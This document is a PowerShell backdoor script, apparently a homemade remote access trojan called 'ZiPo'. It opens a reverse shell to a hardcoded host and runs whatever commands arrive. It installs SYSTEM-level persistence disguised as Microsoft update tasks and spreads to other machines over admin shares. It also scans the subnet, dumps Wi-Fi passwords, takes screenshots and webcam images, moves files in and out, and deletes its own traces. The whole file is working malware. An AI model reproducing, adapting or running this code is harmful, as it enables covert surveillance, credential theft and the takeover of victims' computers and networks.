cmd /c "chcp 65001" | Out-Null

function Connect-ZiPo {
    $srv = "192.168.50.228"
    $port = 6666
    $currentDir = Get-Location


    function Get-AliveHosts {
    function Is-Alive {
        param ([string]$ip)
        try {
            $ping = New-Object System.Net.NetworkInformation.Ping
            $reply = $ping.Send($ip, 300)
            return $reply.Status -eq "Success"
        } catch {
            return $false
        }
    }

    try {
        $ipv4 = (Get-NetIPAddress -AddressFamily IPv4 |
            Where-Object { $_.IPAddress -match '^192\.168\.\d+\.\d+$' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress

        $subnet = ($ipv4 -replace '\.\d+$', '.')
        $alive = @()

        1..254 | ForEach-Object {
            $ip = "$subnet$_"
            Write-Host -NoNewline "`r[*] Scanning $ip..." -ForegroundColor Cyan

            if (Is-Alive $ip) {
                Write-Host "`r[+] $ip is alive        " -ForegroundColor Green
                $alive += $ip
            } else {
                Write-Host "`r[ ] $ip is offline      " -ForegroundColor DarkGray
            }
        }

        return $alive -join "`n"
    }
    catch {
        return "[ERROR] scanHosts failed: $($_.Exception.Message)"
    }
}





    

    function Test-Port {
    param($ip, $port)
    try {
        $tcp = New-Object Net.Sockets.TcpClient
        $tcp.Connect($ip, $port)
        $tcp.Close()
        return $true
    } catch {
        return $false
    }
    } 

    function Test-Ports {
    param (
        [string]$ip,
        [int[]]$ports = @(21,22,23,25,53,80,110,135,139,143,443,445,3389,5985),
        [int]$timeout = 1000
    )

    $results = @()
    foreach ($port in $ports) {
        try {
            $client = New-Object System.Net.Sockets.TcpClient
            $result = $client.BeginConnect($ip, $port, $null, $null)
            $connected = $result.AsyncWaitHandle.WaitOne($timeout, $false)
            $client.Close()

            if ($connected) {
                $results += "[OPEN] ${ip}:${port}"
            } else {
                $results += "[CLOSED] ${ip}:${port}"
            }
        }
        catch {
            $results += "[ERROR] ${ip}:${port} $($_.Exception.Message)"
        }
    }
    return $results -join "`n"
}




    function Spread-Backdoor {
    param($targetIP)

    $remotePath = "\\$targetIP\C$\Users\Public\update.ps1"
    $payloadURL = "https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1"
    Invoke-WebRequest -Uri $payloadURL -OutFile $remotePath

    $cmd = "schtasks /Create /S $targetIP /RU SYSTEM /SC ONSTART /TN WinUpdate /TR 'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\update.ps1' /F"
    Invoke-Expression $cmd
}






    function Upload-File($path) {
        if (Test-Path $path) {
            $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
            return "[UPLOAD]::$(Split-Path $path -Leaf)::" + $b64 + "::END"
        } else {
            return "[ERROR]::FILE NOT FOUND: $path"
        }
    }

   function Add-Persistence {
    try {
        $folder = "$env:APPDATA\WindowsDefender"
        if (-not (Test-Path $folder)) {
            New-Item -ItemType Directory -Path $folder -Force | Out-Null
        }

        $targetPath = Join-Path $folder "MicrosoftUpdate.ps1"
        $url = "https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1"

        Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $targetPath

        $taskName = "MicrosoftEdgeUpdateChecker"


        if (-not (schtasks /Query /TN $taskName -ErrorAction SilentlyContinue)) {
           schtasks /Create /TN "MicrosoftEdgeUpdateChecker" /SC ONSTART `
              /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath`"" `
              /DELAY 0001:00 `
              /RL HIGHEST /RU "SYSTEM" /F
        }

        return "[+] Persistence established successfully!"
    }
    catch {
        return "[ERROR] Persistence failed: $($_.Exception.Message)"
    }
}




    function Download-File($filename, $b64) {
        $out = "$env:TEMP\$filename"
        [IO.File]::WriteAllBytes($out, [Convert]::FromBase64String($b64))
        return "[DOWNLOADED] $out"
    }

    function Get-Credentials {
    try {
        $output = ""

        # 1. Windows Credential Manager (generic credentials)
        $creds = cmdkey /list | Select-String "Target:" | ForEach-Object {
            $target = $_.ToString().Split(":")[1].Trim()
            $output += "`n[TARGET] $target"
        }

        # 2. Chrome saved logins (мета-данные — без дешифровки)
        $chromeLoginPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        if (Test-Path $chromeLoginPath) {
            $output += "`n[+] Chrome login database found: $chromeLoginPath"
        }

        # 3. Firefox профили (только список профилей)
        $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -ErrorAction SilentlyContinue
        foreach ($profile in $firefoxProfiles) {
            $output += "`n[+] Firefox profile: $($profile.FullName)"
        }

        if ([string]::IsNullOrWhiteSpace($output)) {
            return "[INFO] No credentials found or access denied."
        }

        return $output
    }
    catch {
        return "[ERROR] Credential extraction failed: $($_.Exception.Message)"
    }
}
    
    function Dump-WiFi {
    netsh wlan show profiles | ForEach-Object {
        if ($_ -match "All User Profile\s*:\s*(.*)") {
            $profile = $matches[1].Trim()
            $key = (netsh wlan show profile name="$profile" key=clear |
                    Select-String "Key Content\s*:\s*(.*)") |
                    ForEach-Object { $_.ToString().Split(":")[1].Trim() }
            "$profile :: $key"
        }
    } | Out-String
}

    function Take-Screenshot {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $bmp = New-Object Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,
                                         [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
        $graphics = [Drawing.Graphics]::FromImage($bmp)
        $graphics.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
        $path = "$env:TEMP\snap.png"
        $bmp.Save($path, [Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bmp.Dispose()
        return Upload-File $path
    }

    function Capture-Webcam {
    try {
        # WIA попытка
        $manager = New-Object -ComObject WIA.DeviceManager
        foreach ($deviceInfo in $manager.DeviceInfos) {
            try {
                $dev = $deviceInfo.Connect()
                $img = $dev.Items.Item(1).Transfer()
                $file = "$env:TEMP\webcam_$($deviceInfo.Properties[1].Value).jpg"
                $img.SaveFile($file)
                return Upload-File $file
            }
            catch {
                continue
            }
        }

        # Если WIA не нашла камеры — попытка через ffmpeg
        $ffmpegPath = "ffmpeg"
        $tempImage = "$env:TEMP\webcam_ffmpeg.jpg"

        # Убедимся, что ffmpeg доступен
        $ffmpegCheck = & cmd /c "$ffmpegPath -version" 2>$null
        if ($LASTEXITCODE -eq 0) {
            # Найдём название камеры
            $cameraName = (& cmd /c "$ffmpegPath -list_devices true -f dshow -i dummy" 2>&1) |
                Select-String "DirectShow video devices" -Context 0,10 |
                Where-Object { $_.Line -match '"(.*)"' } |
                ForEach-Object { ($_ -split '"')[1] } |
                Select-Object -First 1

            if ($cameraName) {
                # Снимаем кадр
                Start-Process -FilePath $ffmpegPath -ArgumentList "-f dshow -i video=""$cameraName"" -frames:v 1 "$tempImage"" -NoNewWindow -Wait
                if (Test-Path $tempImage) {
                    return Upload-File $tempImage
                }
            }
            return "[ERROR] ffmpeg fallback failed: no camera device detected"
        }
        else {
            return "[ERROR] No usable webcam device found via WIA, and ffmpeg is not available"
        }
    }
    catch {
        return "[ERROR] Webcam capture failed: $($_.Exception.Message)"
    }
}

    function Tree-List {
    try {
        return Get-ChildItem -Path $currentDir -Recurse -ErrorAction SilentlyContinue |
               Where-Object { $_.FullName -notmatch '\\Windows\\|\\Program Files' } |
               Select-Object FullName |
               Out-String
    }
    catch {
        return "[ERROR] $($_.Exception.Message)"
    }
}

    function Self-Destruct {
    try {
        $scriptPath = $MyInvocation.MyCommand.Path
        if (-not $scriptPath) {
            $scriptPath = "$env:APPDATA\WindowsDefender\MicrosoftUpdate.ps1"
        }

        $cleanupBat = "$env:APPDATA\WindowsDefender\cleanup.bat"
        $taskName = "MicrosoftEdgeUpdateChecker"
        $cleanupTask = "ZiPo_Cleanup"

        $batContent = @"
@echo off
timeout /t 5 >nul
del "$scriptPath" /f /q
schtasks /Delete /TN "$taskName" /F >nul 2>&1
del "%~f0" /f /q
schtasks /Delete /TN "$cleanupTask" /F >nul 2>&1
"@

        $batContent | Set-Content -Path $cleanupBat -Encoding ASCII

        schtasks /Create /TN $cleanupTask /SC ONCE /TR "`"$cleanupBat`"" `
            /ST ((Get-Date).AddMinutes(1).ToString("HH:mm")) /RL HIGHEST /F | Out-Null

        Start-Sleep -Seconds 1
        Stop-Process -Id $PID -Force
    }
    catch {
        return "[ERROR] Self-destruct failed: $($_.Exception.Message)"
    }
}






    Add-Persistence
    while ($true) {
        try {
            $tcp = [Net.Sockets.TcpClient]::new($srv, $port)
            $stream = $tcp.GetStream()
            [byte[]]$buffer = 0..65535 | % { 0 }

            $esc = [char]27
            $clear = "$esc[2J$esc[H"
            $banner = @"
${esc}[31m
   ________ _______  ________  ________
  |\  _____\\  ___ \|\   __  \|\   ____\
  \ \  \__/ \ \   __<\ \  \|\  \ \  \___|
   \ \   __\ \ \  \_|\ \ \   __  \ \  \   
    \ \  \_|  \ \  \_|\ \ \  \ \  \ \  \____
     \ \__\    \ \_______\ \__\ \__\ \_______\
      \|__|     \|_______|\|__|\|__|\|_______|${esc}[0m

${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
OS: $([System.Environment]::OSVersion.VersionString)
Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
------------------------------------------------------------
"@

            $intro = $clear + $banner + "`nPS $currentDir> "
            $bbytes = [Text.Encoding]::UTF8.GetBytes($intro)
            $stream.Write($bbytes, 0, $bbytes.Length)
            $stream.Flush()

            while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
                $cmd = ([Text.Encoding]::UTF8).GetString($buffer, 0, $i).Trim()

                try {
                    if ([string]::IsNullOrWhiteSpace($cmd)) {
                        $response = ""
                    }
                    elseif ($cmd.StartsWith("!get")) {
                        $path = $cmd.Substring(4).Trim()
                        if ([string]::IsNullOrWhiteSpace($path)) {
                            $response = "[ERROR] Usage: !get <full_path_to_file>"
                        } else {
                            $response = Upload-File $path
                        }
                    }
                    elseif ($cmd.StartsWith("!post")) {
                        $parts = $cmd.Split("::")
                        if ($parts.Length -eq 3) {
                            $response = Download-File $parts[1].Trim() $parts[2].Trim()
                        } else {
                            $response = "[ERROR] INVALID POST FORMAT"
                        }
                    }
                    elseif ($cmd -like "cd *") {
                        $target = $cmd.Substring(3).Trim()
                        Set-Location -Path $target
                        $currentDir = Get-Location
                        $response = ""
                    }
                    elseif ($cmd -eq "!sysinfo") {
                        $response = Get-ComputerInfo | Out-String
                    }
                    elseif ($cmd -eq "!sc") {
                        $response = Take-Screenshot
                    }
                    elseif ($cmd -eq "!webcam") {
                        $response = Capture-Webcam
                    }
                    elseif ($cmd -eq "!wifi") {
                        $response = Dump-WiFi
                    }
                    elseif ($cmd -eq "!tree") {
                        $response = Tree-List
                    }
                    elseif ($cmd -eq "!creds") {
                        $response = Get-Credentials
                    }
                    elseif ($cmd -eq "scanHosts") {
                        $response = Get-AliveHosts
                    }
                    elseif ($cmd.StartsWith("spread")) {
                        $args = $cmd.Split(" ")
                        if ($args.Length -eq 2) {
                            $target = $args[1]
                            $response = Spread-Backdoor -targetIP $target
                        } else {
                            $response = "[USAGE] spread <targetIP>"
                        }
                    }
                    elseif ($cmd.StartsWith("portFuzz")) {
                        $args = $cmd.Split(" ")
                    
                        if ($args.Length -eq 2) {
                            $ip = $args[1]
                            $response = Test-Port -ip $ip
                        }
                        elseif ($args.Length -eq 3) {
                            $ip = $args[1]
                            $port = [int]$args[2]
                            $response = Test-Port -ip $ip -ports @($port)
                        }
                        else {
                            $response = "[USAGE] porttest <ip> [port]"
                        }
                    }

                    elseif ($cmd -eq "!die") {
                        $response = "[!] Self-destruct initiated..."
                        $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
                        $stream.Write($outBytes, 0, $outBytes.Length)
                        $stream.Flush()
                        Self-Destruct
                    }
                    else {
                        $sb = [ScriptBlock]::Create("cd '$currentDir'; $cmd")
                        $output = & $sb 2>&1 | Out-String
                        $response = $output.TrimEnd()
                    }
                }
                catch {
                    $response = "[ERROR] $($_.Exception.Message.ToUpper())"
                }

                # Обновлённое добавление приглашения:
                $response = ($response.TrimEnd() + "`nnPS $currentDir> ")

                $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
                $stream.Write($outBytes, 0, $outBytes.Length)
                $stream.Flush()
            }

            $stream.Close()
            $tcp.Close()
        }
        catch {
            Start-Sleep -Seconds 5
        }
    }
}

Connect-ZiPo
